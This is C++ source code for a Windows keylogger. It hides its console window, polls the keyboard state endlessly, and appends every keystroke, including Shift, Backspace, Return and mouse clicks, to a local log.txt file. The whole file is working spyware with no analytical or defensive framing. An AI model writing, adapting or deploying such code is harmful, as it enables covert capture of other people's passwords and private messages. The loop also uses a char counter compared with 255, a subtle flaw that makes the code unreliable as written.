
#include <iostream>
using namespace std;
#include <Windows.h>

#include <fstream>

int Save(int _key, char const* file);

int main() {
    FreeConsole();  // hide Console (recommended)
    while (true) {
        Sleep(10);
        for (char i = 8; i <= 255; i++)
            if (GetAsyncKeyState(i) == -32767)  // Button pressed?
                Save(i, "log.txt");
    }
    system("pause");
    return 0;
}

int Save(int _key, char const* file) {
    cout << _key << endl;
    Sleep(10);
    fstream OUTPUT_FILE;
    OUTPUT_FILE.open(file, ios::app);

    if (_key == VK_SHIFT)
        OUTPUT_FILE << "[SHIFT]";
    else if (_key == VK_BACK)
        OUTPUT_FILE << "[BACK]";
    else if (_key == VK_LBUTTON)
        OUTPUT_FILE << "[LBUTTON]";
    else if (_key == VK_RETURN)
        OUTPUT_FILE << "[RETURN]";
    else if (_key == VK_ESCAPE)
        OUTPUT_FILE << "[ESCAPE]";
    else
        OUTPUT_FILE << (const char*)&_key;

    OUTPUT_FILE.close();
    return 0;
}